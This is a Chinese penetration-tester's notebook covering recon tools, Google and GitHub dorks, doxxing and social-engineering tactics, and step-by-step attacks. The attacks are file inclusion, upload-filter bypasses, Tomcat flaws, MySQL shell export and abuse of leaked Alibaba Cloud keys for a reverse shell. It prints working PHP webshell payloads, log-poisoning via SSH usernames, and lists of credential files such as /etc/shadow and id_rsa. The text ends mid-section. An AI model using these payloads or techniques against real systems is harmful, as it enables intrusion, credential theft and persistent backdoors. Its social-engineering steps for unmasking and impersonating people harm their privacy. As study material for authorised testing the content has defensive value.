# PentestNote
近期想把一些渗透笔记,记录下来方便自己查阅,也希望能帮到有需要的朋友.

个人觉得学习就是知识输入和输出,只有这样才能更好的提升.

阅读推荐:使用**typora**


不定时更新,权当是记笔记了.

![safe6](http://qiniu.safe6.cn/qr2.png)

# 前期信息收集



## 工具推荐

### 子域名

- OneForAll https://github.com/shmilylty/OneForAll	
- ksubdomain：https://github.com/knownsec/ksubdomain



### 自动化信息收集

- ARL https://github.com/TophantTechnology/ARL



### 目录扫描

win下面用御剑和7kbscan就够了,关键得看字典吧.我公众号之前有推荐过

- safe目录扫描 https://github.com/safe6Sec/dirScan
- dirsearch：https://github.com/maurosoria/dirsearch
- 7kbscan：https://github.com/7kbstorm/7kbscan-WebPathBrute



###  扫描器

- nessus扫主机
- awvs 扫web
- burp 不用说
- nmap 扫端口
- rustscan 超快的端口扫描,扫完自动调用nmap识别指纹https://github.com/RustScan/RustScan
- xray 结合burp用来被动扫描 https://github.com/chaitin/xray



### 在线工具

#### 指纹

- https://www.godeye.vip/

- http://whatweb.bugscaner.com/look 

- http://finger.tidesec.net/

#### 综合扫描
- https://scan.top15.cn/web/

#### 子域/旁站

- https://phpinfo.me/old/domain

- https://webscan.cc/

- https://dnsdumpster.com/

- https://www.yougetsignal.com/tools/web-sites-on-web-server/

- https://www.robtex.com/

#### dns历史记录

可用来找真实ip

- http://www.siteinfotool.com/
- http://toolbar.netcraft.com/site_report
- https://dnsdumpster.com/
- https://viewdns.info/iphistory/
- https://asm.ca.com/

#### 匿名

- Sms
    https://www.materialtools.com/
    http://receivefreesms.com/
- Email
      https://10minutemail.net/
      https://zh.mytrashmailer.com/
      http://24mail.chacuo.net/enus
      https://www.linshiyouxiang.net/
- Fake id
      https://www.fakenamegenerator.com/
      http://www.haoweichi.com/
      https://www.fakeaddressgenerator.com/
- ip代理池
- tor网络












## google语法

1. 后台地址

- site:xxx.xxx 管理后台/登陆/管理员/系统
- site:xxx.xxx inurl:login/admin/system/guanli/denglu

1. 敏感文件

- site:xxx.xxx filetype:pdf/doc/xls/txt
- site:xxx.xxx filetype:log/sql/conf

1. 测试环境

- site:xxx.xxx inurl:test/ceshi
- site:xxx.xxx intitle:测试

1. 邮箱/QQ/群

- site:xxx.xxx 邮件/email
- site:xxx.xxx qq/群/企鹅/腾讯

1. 其他

- site:xxx.xxx inurl:api
- site:xxx.xxx inurl:uid=/id=
- site:xxx.xxx intitle:index of

## Github搜索

- @xxx.xxx password/secret/credentials/token/config/pass/login/ftp/ssh/pwd
- @xxx.xxx security_credentials/connetionstring/JDBC/ssh2_auth_password/send_keys

## 关于社工

1. 查询whois得到电话,邮箱,备案号.备案号查注册人

2. 电话通过支付宝转帐获取真实姓名,利用qq反查微信,qq推测

3. 电话号码添加到通讯录,让第三方app通过通讯录匹配出信息(抖音,支付宝,qq,微信......)

4. 社工库,tg群查泄漏密码

5. 手机号查注册过的网站

   ```
   https://www.reg007.com/
   https://www.usersearch.org/
   ```

6. 得到管理员设置密码习惯,命名习惯.进行爆破,跑备份

7. 利用个人信息生成社工字典

8. 冒充目标好友

9. 近源渗透,wifi,badusb

10. 鱼叉攻击,利用office宏代码,第三方软件捆绑

11. 水坑攻击

12. 可通过微博进行定位,qq抓ip定位,图片exif定位

13. 各种匿名




## 关于突破口

1. 无头绪的时候,可以去fofa找相同类型的站点拿下,然后进行代码审计.
2. 主站一般没机会,尽量的去收集目标资产(渗透本质是信息收集),没有拿不下的站点,只要信息收集到位.如果还不行就社工.
3. 遇到难啃的骨头,可以对报403的目录进行扫描,也许会有不错的收获
4. 多做漏洞复现,遇到了对应的漏洞就不用去慢慢研究





## 历史漏洞

- https://cxsecurity.com/
- http://vulhub.org.cn/ (常用)
- http://cve.scap.org.cn/
- http://www.cnnvd.org.cn/
- https://vulmon.com/ (常用)
- https://sploitus.com (常用)
- https://vulners.com 
- https://www.exploit-db.com/ (常用)
- https://www.seebug.org/
- https://packetstormsecurity.com/
- https://snyk.io/vuln (常用)
- https://www.cvedetails.com/
- https://www.cvebase.com/ (常用,cve分析和poc)
- 乌云镜像

# 漏洞攻击

## 文件读取漏洞

1、一般我拿到一个任意文件读取得先判断权限大不大，如果权限够大的话可以直接先把/etc/sadow读下来，权限不够就读/etc/passwd，先把用户确定下来，方便后续操作

2、读取各个用户的.bash_history能翻有用的信息，如编辑一些敏感文件

3、读取程序配置文件（如数据库连接文件,可以利用数据库写shell）

4、读取中间件配置文件（weblogic/tomcat/apache的密码文件、配置文件,确定绝对路径，方便后面读源码）
5、读取一些软件的运维配置文件（redis/rsync/ftp/ssh等等程序的数据、配置、文档记录）
6、读取程序源代码，方便后面做代码审计，找突破口
7、读取web应用日志文件，中间件的日志文件，其他程序的日志，系统日志等（可以网站后台地址、api接口、备份、等等敏感信息）
8、还有就是可以用字典先跑一波(字典之前有分享过)，信息收集还是要全面点。


windows常见的敏感文件路径:

```
C:\boot.ini //查看系统版本
C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
C:\Windows\repair\sam //存储系统初次安装的密码
C:\Program Files\mysql\my.ini //Mysql配置
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\Windows\php.ini //php配置信息
C:\Windows\my.ini //Mysql配置信息
C:\Windows\win.ini //Windows系统的一个基本系统配置文件
```


Linux常见的敏感文件路径:

```
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_ras.keystore
/root/.ssh/known_hosts //记录每个访问计算机用户的公钥
/etc/passwd
/etc/shadow
/etc/my.cnf //mysql配置文件
/etc/httpd/conf/httpd.conf //apache配置文件
/root/.bash_history //用户历史命令记录文件
/root/.mysql_history //mysql历史命令记录文件
/proc/mounts //记录系统挂载设备
/porc/config.gz //内核配置文件
/var/lib/mlocate/mlocate.db //全文件路径
/porc/self/cmdline //当前进程的cmdline参数
```




## 文件包含漏洞

**一、利用思路总结：**

**1、包含一些敏感的配置文件，获取目标敏感信息**

**2、配合图片马getshell**

**3、包含临时文件getshell**

**4、包含session文件getshell**

**5、包含日志文件getshell(Apach、SSH等等)**

**6、利用php伪协议进行攻击**

 

**二、具体利用方法：**

**①包含一些敏感的配置文件**

windows常见的敏感文件路径:
```
C:\boot.ini //查看系统版本
C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
C:\Windows\repair\sam //存储系统初次安装的密码
C:\Program Files\mysql\my.ini //Mysql配置
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\Windows\php.ini //php配置信息
C:\Windows\my.ini //Mysql配置信息
C:\Windows\win.ini //Windows系统的一个基本系统配置文件
```

Linux常见的敏感文件路径:
```
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_ras.keystore
/root/.ssh/known_hosts //记录每个访问计算机用户的公钥
/etc/passwd
/etc/shadow
/etc/my.cnf //mysql配置文件
/etc/httpd/conf/httpd.conf //apache配置文件
/root/.bash_history //用户历史命令记录文件
/root/.mysql_history //mysql历史命令记录文件
/proc/mounts //记录系统挂载设备
/porc/config.gz //内核配置文件
/var/lib/mlocate/mlocate.db //全文件路径
/porc/self/cmdline //当前进程的cmdline参数
```

 

**绝对路径：**

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibIc2k614Bbn1libAOQhtDRX1R5Zc7npXmyBqjk9jic2TKmju4vAm2rDnA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

**../跨目录读取：**

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibsGB5eqaug8URYTHUngic9iaP7SdqhhT5uwXuq6yYKkdg4oDXXt3OV29A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

 

**②配合图片马getshell**

需要有一个文件上传的点，并且能够上传图片马，图片马的内容如下：

```
<?php fputs(fopen("panda.php","w"),'<? @eval($_POST[PANDA]);?>');?>
```

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibuHDML0ia1F3icQbDxYftBnOmBIlWbdia1wLAYmp0EPB3rJ0QpxbBjpSAg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

会在当前目录下生成panda.php，密码为PANDA，连接即可

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibSrDjjOeamDLqUbUq3ILhroYhea8ME4qMLdnb5wMHECNVRdbqqLMsibw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



 

**③包含临时文件+phpinfo getshell**

在PHP文件包含漏洞中，当我们找不到用于触发RCE的有效文件时，如果存在PHPINFO（它可以告诉我们临时文件的随机生成的文件名及其位置），我们可能可以包含一个临时文件来利用它升级为RCE。

 

**利用方法简述：**

在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。

同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，自然也包含临时文件名。

在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。

但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。

 

**这个时候就需要用到条件竞争，具体流程如下：**

1、发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据

2、因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大

3、php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接

4、所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包

5、此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除

6、利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell

 

**操作过程：**

**访问存在文件包含漏洞的页面**

```
http://192.168.136.128:8080/lfi.php?file=/etc/passwd
```

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibq7iathIdDFVib8elfl2ojziaJqQs9WJ5vA77ZFYwTeRG8icHoibWJjTEK4A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

访问phpinfo页面，需要确实存在

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibCytdyZHhE2TEKyN2yOGXFoBMbsfiajj9tyUFH1LWyXXdOuAQqqZDqag/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

 

然后利用exp进行利用：

- 

```
python2 exp.py 目标ip 8080 100
```

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibWsQwkcBmrnWQFvepzByhAaT1HLzpu7fe9EFYqRywibrwFajA7oBFqiag/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

在189次请求时，就写入成功了



脚本exp.py实现了上述漏洞利用过程，成功包含临时文件后，会利用file_put_contents函数写入<?=eval($_REQUEST[1])?>一句话后门到/tmp/g文件中，这个文件会永久留在目标机器上

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibPztrWuAFn0QTx0XIEjFNEZf7ibTd82EiaFxicHGhPQ7uWlXfiaYrKdZfbg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



然后直接利用蚁剑进行连接即可，密码为1：

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibI5PuvsGpfI0gWTzRHEwoicoU3McPG9cKfjGWic7Yv11Marjjkc6QyUWw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

 

 

 

**④包含session文件getshell**

session简介：cookie存在客户端，session存在服务端，cookie一般用来保存用户得账户密码，session一般用来跟踪会话。

**利用场景：**

一般对于登陆点存在注册用户的，那么就可以起一个为payload的名字，这样会将payload保存在session文件中

利用条件：

**①session文件路径已知**

session文件路径位置可以通过phpinfo页面来获取：session.save_path参数

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibbDFhfduBoIT0x0RwbfJ8hp2LTu22NLJLXytRexYHN1PW53P0GctI3Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

也可以猜测常见的一些session存储位置：

- 
- 

```
/var/lib/php/sess_[PHPSESSID]/tmp/sess_[PHPSESSID]
```

**②且其中部分内容可控制**

 

**利用方式：**

访问漏洞页面，在参数中构造payload

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibhoaENlk0KrwhwvaG7cTLt1dJVdn1VNeaxicxXFNfKBW9zGO1yKtmdpQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

然后我们的首要任务就是获取session文件名，可通过谷歌浏览器，或者burp抓包查看

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibWMmvPROVlpTfvta9CRIagezTqpGfsp1lquleeQDWYTAbBpTn4Q8Ctw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

 

文件名：sess_hvjhivr3iptal3909f90rksu9p，利用文件包含漏洞跨目录包含session文件getshell

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibkoKlMTR07PtF77W9kjiaQSqJDbknO7A22JdFC2ibZHxLhUWvEYKJh7IA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



连接webshell

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibMNiavmdeC22KwC6ZR4kdRndn3dIngpbr6xj45nh541OsLxMiaXy56mSA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

 

**⑤包含日志文件getshell**

**1.包含Apache日志文件**

在用户发起请求时，服务器会将请求写入access.log(会记录访问IP、访问链接、Referer和User-Agent等)，当请求错误时将错误写入error.log

**利用条件：**日志文件的存储路径，并且日志文件可读。

**①apache的日志文件可以通过phpinfo页面来查询，apache2handler 中的server root就是apache的安装路径，那么日志文件应该就是在这个路径下的logs目录中**

**②或者通过猜测常见日志文件的路径/usr/local/apache/logs/error_log或者access_log**

**③也可用通过先包含配置文件来确定日志文件路径**

- 
- 

```
index.php?page=/etc/init.d/httpdindex.php?page=/etc/httpd/conf/httpd.conf
```

 

**利用方式：**

因为会自动url编码，会导致无法利用，所以抓包再请求

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibILg71QSriaVicBkWxaev9IpmrlzRyKP0Tz1yToSPDU7WGewq3ib3cYvIQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



可以看到error.log文件中已经成功写入了payload

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibMkPvIM4j8CsHdWHV7kYSFSXNVbymciaPHKVqibZiaqPicUFhRThfIqybEg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



然后包含log文件路径即可

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbib3wPM0ibYiaEx35XrvDlXjbG6rnJKOFeeutXBoapvSFNydYkwnaSAAAvA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



连接webshell

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibMNiavmdeC22KwC6ZR4kdRndn3dIngpbr6xj45nh541OsLxMiaXy56mSA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



**2.包含SSH日志文件**

- 

```
ssh '<?php phpinfo();?>'@192.168.136.143
```

这样把用户名写成phpinfo，ssh的登陆日志就会把此次的登陆行为记录到日志中，利用包含漏洞getshell

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibLEl6dAVGe8c6AfyrnevYGZVKkQO8h0H6syPzNG7KMauQrgmRyyTtzw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



可以看到我们登陆的行为都被记录到了日志当中

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibIOibBzIOLll8ooQ5sWeF2fSQ7rtnP6APU09wPibUht1o3ia6E9Peyt6NQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



可以看到刚才登陆的时候，成功phpinfo写入到日志文件中并且成功解析

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibxS7Brrqa6zc0M4T5jmzq1vEG2Fsiaq2huYwD3QVhD9zWku3rHCSCYcQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 



通过phpinfo查看到了网站根目录

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibQRHNccvl4ODY5iaDEUic4lpyicY7RiaqWycEtEMPYv1NJuoSSBwlOh8Ocw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

本来想着利用文件包含漏洞配合fputs和fopen函数在网站根目录写入一句话木马getshell，但是由于单引号太多就报错了，只能另谋出路

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibIsYlBtsR4lng0YiaeIXYV1z139YrLPsbRs7STvVf25KhuhDWFxAV54Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



然后就想到了把执行命令的一句话木马写入日志，利用文件包含执行反弹shell

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibuKZsD9bvlceKys2xVDMmEibfzvuicgMEBc0R8bbX9pDu00ia6YsHaUcgA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



然后构造请求执行命令，因为刚才我写进去的是通过GET方式用panda参数传参，多个参数之间用&符号连接，还是要注意，命令要url编码再执行

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibPsafM6CeRIB6Aja4KKcXibgwQZtpooic4hQp9UBszS3CiaGfGmPgTV3hA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)









## 文件上传漏洞



![image-20201125140003211](img/image-20201125140003211.png)



练习环境：https://github.com/c0ny1/upload-labs

参考文章:

https://www.jianshu.com/p/74ca4e884645 (上传总结)

https://www.jianshu.com/p/1ccbab572974 (解析总结)

**特殊后缀绕过黑名单**

apache

> php、php3、php4、php5、phpt、phtml

iis

> asa、cer、cdx



**上传.htaccess文件**

我们需要上传一个.htaccess文件，内容为：

```xml
#所有文件都会解析成php
SetHandler application/x-httpd-php

# 解析指定jpg
 <FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
  </FilesMatch>
# 解析xx后缀
 AddType application/x-httpd-php xxx

```



**NTFS流冒号截断**

如上传"test.asp:1.jpg"文件，会生成一个名为"test.asp"的空文件，原理是利用Windows的NTFS可替代数据流的特性。另外，

":"截断操作是优先级高于会报错的字符(0x00除外)的，会先截断，只要报错字符在":"后面，系统是不会报错的。
 如果":"是文件名的最后一个字符，则不会截断，会报错
 一个文件名中如果包含1个以上的":"号，也是会报错



**::$DATA绕过**

windows特性，可在后缀名中加” ::$DATA”绕过





**nginx空字节代码执行漏洞**

在fast-cgi关闭的情况下，nginx版本:0.5.*, 0.6.*, 0.7- 0.7.65, 0.8 -0.8.37，nginx在图片后附加php代码然后通过访问

```css
xx.jpg%00.php
```



**IIS 7.0&7.5畸形解析漏洞和nginx畸形解析漏洞**

默认fast-cgi开启状况下，在一个文件路径后面加上/xx.php会将原来的文件解析为php文件

上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会解析为php



**iis6畸形目录解析漏洞**

原因是web应用程序和IIS对同一文件的文件名称（类型）理解不一致造成的

1. 畸形目录解析
    /xxxx.asp/xxx.jpg
    即.asp结尾的目录下面，而被IIS当成可执行文件来解析
2. 分号文件解析
    test.asp;.jpg



**Apache文件名解析**

Apache对文件的解析名不是仅仅认识最后一个后缀名，而是从右向左，依次识别，直到遇到自己能解析的文件名为止

.php.sfds.sfsdf.wewfgw.gwegw

只认识php就解析为php



**Apache换行解析漏洞 （CVE-2017-15715）**

其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析

上传webshell,然后在1.php后面插入一个\x0A换行



**nginx文件名逻辑漏洞(CVE-2013-4547)** 

受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x

正常上传一个附加代码的图片"test.jpg"，访问时后面+"空格"+"\0"+".php" 即让图片作为php文件解析

(不能编码,burp改包,把第二个空格改为00)

```bash
"/test.jpg  .php"
/test.jpg[0x20][0x00].php
```



## 敏感信息泄漏利用



### 阿里云Access Key利用

首先用行云管家导入云主机，网站地址：https://yun.cloudbility.com/

步骤：选择阿里云主机 -> 导入key id跟key secret -> 选择主机 -> 导入即可（名字随便输）

我们用这个只是为了得到两个数据，就是**实例ID以及所属网络**，拿到就可以走人了.

这里我们打开阿里API管理器，这个是阿里提供给运维开发人员使用的一个工具，

https://api.aliyun.com/#/?product=Ecs

点击左边的搜素框输入command，我们会用到CreateCommand跟InvokeCommand，CreateCommand是创建命令，InvokeCommand是调用命令。继续往下看

 

![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribSc1yXehrLAgMEv9p7DyEFfuSru0zW7YlA50JjAtIEibWVHYEGo0qtJVnQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



 

 

Name部分随意

Type指的是执行脚本类型

  RunBatScript：创建一个在Windows实例中运行的 Bat 脚本。

  RunPowerShellScript：创建一个在Windows实例中运行的PowerShell脚本。

  RunShellScript：创建一个在Linux实例中运行的Shell脚本。

CommandContent为执行命令，需要注意的是这里是填写base64编码。

填写完后选择python

 

![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribScFLYCmT0CO5KSxJSZNa8LJATJc0jC4cRkPHjuCoUr4pDUib44HRQUDUA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



 

点击**调试SDK示例代码**，此时会弹出Cloud shell窗口，并创建一个CreateCommand.py文件，用vim编辑器打开CreateCommand.py，修改accessKeyId与accessSecret。

 

![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribScqAeuZ8UumNuZqwSyLhMkWBibHpQbEINQKYY7yHqNYOMFyqrlnmTgu9Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribScoM4GVJbBWJJfaJTNgHFNuEqZSgkrdicOwr5HRxBkwo2ffNNXM2LLKoQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



执行CreateCommand.py，会返回一个RequestId与CommandId，记录CommandId，后面调用命令会用到。

 

![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribScBE7czOcxicKZuXHIpRicVgicRAibTmDK5oGhjZTXQtqibV3iatJjDGWPD2mQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



打开InvokeCommand

RegionId填写行云管家中的所属网络

CommandId填写刚刚执行CreateCommand.py返回的CommandId

InstanceId填写示例ID，行云管家中获取到的那个

继续点击**调试SDK代码**，会生成一个InvokeCommand.py文件，同样用vim编辑器把accessKeyId与accessSecret修改了。

 

![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribScfCqYTQiaFqlLrnG8ntYaecWnZZwBJqDLHeC7cBHopSxFdhibqObyVhdw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



 

修改完成后使用nc监听端口，执行InvokeCommand.py。

 

![img](https://mmbiz.qpic.cn/mmbiz_png/gqALwUU9cicxI5hGqt5EdOUibOTj95ribScWV8vIzqkd7OGnQH4xszFoHurKCiagO5vGxQLMeq2jBA6KMeaFBWseJg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

成功执行命令反弹shell，收工。

#### alicloud利用工具

https://github.com/iiiusky/alicloud-tools



 

## 中间件安全



### tomcat安全

参考:https://www.anquanke.com/post/id/223002 不安全的中间件——Tomcat



**自带的默认应用**

1. examples目录

   1. 信息泄漏
   2. /examples/servlets/servlet/SessionExample 允许用户对session进行操纵(老系统可能出现)

2. admin管理页面

   1. Tomcat 5.0.4版本之前都是默认安装,.5.0.4之后版本默认存在该目录，但是功能并不全

      1. 默认路径为/admin
      2. tomcat-user.xml文件中进行账号密码的配置
      3. 功能和manager下面的差不多

   2. manager管理页面

      1. 最常见的,基本tomcat默认都有
      2. 默认没有设置登录口令,需要tomcat-user.xml文件中进行账号密码的配置
      3. 登录使用的Basic认证方式(请求头里面的Authorization为base64编码,可以用burp爆破)
      4. Tomcat manager包含4个不同的角色：
         - manager-gui：允许访问html页面接口(即URL路径为/manager/html/*)
         - manager-script：允许访问纯文本接口(即URL路径为/manager/text/*)
         - manager-jmx：允许访问JMX代理接口(即URL路径为/manager/jmxproxy/*)
         - manager-status：允许访问Tomcat只读状态页面(即URL路径为/manager/status/*)
      5. 部署war包拿shell

   3. AJP协议

      1. 比较鸡肋
      2. 目前爆出的可直接利用的就是CVE-2020-1938（AJP文件包含漏洞）

   4. debug模式

      1. 默认不开启
      2. 调试端口8000,指纹jdwp
      3. 低版本的jdk中会存在漏洞，可以通过jdwp来执行系统命令

   5. CVE-2016-8735反序列化

      1. 条件:配置JMX做监控时使用了JmxRemoteLifecycleListener
      2. ysoserial来进行漏洞攻击利用

   6. CVE-2017-12615 & CVE-2017-12616 put文件上传

      1. 范围7.0.0 – 7.0.79
      2. 条件:手动将web.xml中的readonly设置为false
      3. 利用构造put上传shell,返回201为成功

   7. CVE-2019-0232命令注入

      1. 该漏洞的利用条件较为苛刻，需同时满足下列条件：

         1. 系统为Windows
         2. 启用了CGI Servlet（默认为关闭）
         3. 启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）

         影响范围：

         ```
         9.0.0.M1-9.0.17
         8.5.0-8.5.39
         7.0.0-7.0.93
         ```
      
   8. CVE-2020-1938 AJP缺陷
   
      1. 文件读取,代码执行
   
      2. 范围
   
         ```
         Apache Tomcat 6
         Apache Tomcat 7 < 7.0.100
         Apache Tomcat 8 < 8.5.51
         Apache Tomcat 9 < 9.0.31
         ```



## 数据库安全

### mysql渗透总结

#### 一、sqlshell获取

要利用mysql首先得拿到一个可以执行sql的mysql才能利用，下面就说一下几种常见姿势，欢迎补充。

1、弱口令

这个比较简单，网上工具很多如美杜莎，九头蛇这些比较知名的，msf也有相应的模块。我自己之前也写过一个。要是运气好的话直接跑到弱口令就直接进去，当然也可以配合社工字典来跑这样成功率更高。

2、文件读取漏洞

需要挖一个任意文件读取漏洞，然后利用读网站的配置文件，里面存放着数据库账号密码。

3、信息泄露

扫目录扫网站备份文件，或者git泄露

4、sql注入

这个不用多说，要是权限够大直接sqlmap os-shell一把梭

5、身份认证绕过漏洞(CVE-2012-2122)

受影响版本：

MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.

MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.

也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。

在msf里面有模块，可以直接用auxiliary/scanner/mysql/mysql_authbypass_hashdump来跑

当数据库不能外连可以通过以下方法开放外连(注意防火墙)：

可以修改`host`为`%`并刷新权限后，默认root等账号不允许远程连接

```
use mysql;  
update user set host = '%' where user = 'root';  
FLUSH PRIVILEGES ;  
select host, user from user;
```

#### 二、mysql拿shell

##### 1、用命令直接导出shell

原理：利用导出命令来导出shell。

条件：

1. 需要知道网站的物理路径(绝对路径)

通过程序报错，日志泄露，phpinfo，php探针等方式可以获取到物理路径。

2.允许导出

先查看是否允许导入导出

```
show variables like '%secure%'    
 
```

secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出

当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下，此时如果读写发生在其他文件夹，就会报告如下错误：

```
RROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement  
 
```

当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制

如果条件都满足的话,就可以开始了

outfile

```
select '<?php eval($_POST[xxx]) ?>' into outfile '/var/www/xx.php';  
 
```

dumpfile

```
